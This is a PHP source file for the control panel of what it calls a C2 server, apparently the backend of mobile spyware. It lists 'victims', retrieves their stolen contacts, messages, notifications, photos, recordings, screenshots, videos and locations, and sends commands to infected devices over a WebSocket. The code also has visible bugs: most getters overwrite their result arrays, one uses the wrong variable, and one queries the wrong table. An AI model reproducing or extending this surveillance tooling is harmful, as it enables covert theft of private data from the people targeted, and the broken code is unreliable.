<?php

namespace Server\Controller;

use Server\Model\Client;
use Server\Controller\Base;
use Server\Library\WebSocketClient;
use Server\Model\Contact;
use Server\Model\Image;
use Server\Model\Location;
use Server\Model\Message;
use Server\Model\Notification;
use Server\Model\Recording;
use Server\Model\Screenshot;
use Server\Model\Video;

use function Server\Library\render;

class ControlPanel extends Base
{

    private WebSocketClient $socketClient;

    public function __construct(WebSocketClient $webSocketClient)
    {
        parent::__construct();
        $this->socketClient = $webSocketClient;
    }

    /**
     * C2 home page
     */
    public function home(): void
    {
        $clients = $this->getClients();

        render('home.php', ['clients' => $clients]);
    }

    /**
     * Get victims
     * 
     * @return array<Client>
     */
    private function getClients(): array
    {
        $clients = [];
        $query = "SELECT * FROM VICTIM";
        $rows = $this->database->select($query, []);

        foreach ($rows as $row) {
            $output = Client::parse($row);
            if (!is_null($output))
                $clients[] = $output;
        }

        return $clients;
    }

     /**
     * Get victim's contacts
     * 
     * @return array<Contact>
     */
    private function getContacts(int $victimID): array
    {
        $contacts = [];
        $query = "SELECT * FROM CONTACT WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $contacts = new Contact(
                $row['id'],
                $row['client_id'],
                $row['name'],
                $row['number']
            );
        }

        return $contacts;
    }

     /**
     * Get victim's images
     * 
     * @return array<Image>
     */
    private function getImages(int $victimID): array
    {
        $images = [];
        $query = "SELECT * FROM IMAGE WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $images = new Image(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $images;
    }

     /**
     * Get victim's known locations
     * 
     * @return array<Location>
     */
    private function getKnownLocations(int $victimID): array
    {
        $knownLocations = [];
        $query = "SELECT * FROM VIDEO WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $knownLocations = new Location(
                $row['id'],
                $row['client_id'],
                $row['timestamp']
            );
        }

        return $knownLocations;
    }

     /**
     * Get victim's messages
     * 
     * @return array<Message>
     */
    private function getMessages(int $victimID): array
    {
        $messages = [];
        $query = "SELECT * FROM MESSAGE WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $messages = new Message(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $messages;
    }

     /**
     * Get victim's notifications
     * 
     * @return array<Notification>
     */
    private function getNotifications(int $victimID): array
    {
        $notifications = [];
        $query = "SELECT * FROM NOTIFICATION WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $messages = new Notification(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $notifications;
    }

     /**
     * Get victim's recordings
     * 
     * @return array<Recording>
     */
    private function getRecordings(int $victimID): array
    {
        $recordings = [];
        $query = "SELECT * FROM RECORDING WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $recordings = new Recording(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $recordings;
    }

     /**
     * Get victim's screenshots
     * 
     * @return array<Screenshot>
     */
    private function getScreenshots(int $victimID): array
    {
        $screenshots = [];
        $query = "SELECT * FROM SCREENSHOT WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $screenshots = new Screenshot(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $screenshots;
    }

     /**
     * Get victim's videos
     * 
     * @return array<Video>
     */
    private function getVideos(int $victimID): array
    {
        $videos = [];
        $query = "SELECT * FROM VIDEO WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $videos = new Video(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $videos;
    }

    private function sendCommand(int $cmd, int $victimID, int $webSocketID): void
    {
        $msg = [
            "type" => "server",
            "cmd" => $cmd,
            "client_id" => $victimID,
            "resource_id" => $webSocketID
        ];

        $this->socketClient->send($msg);
    }
}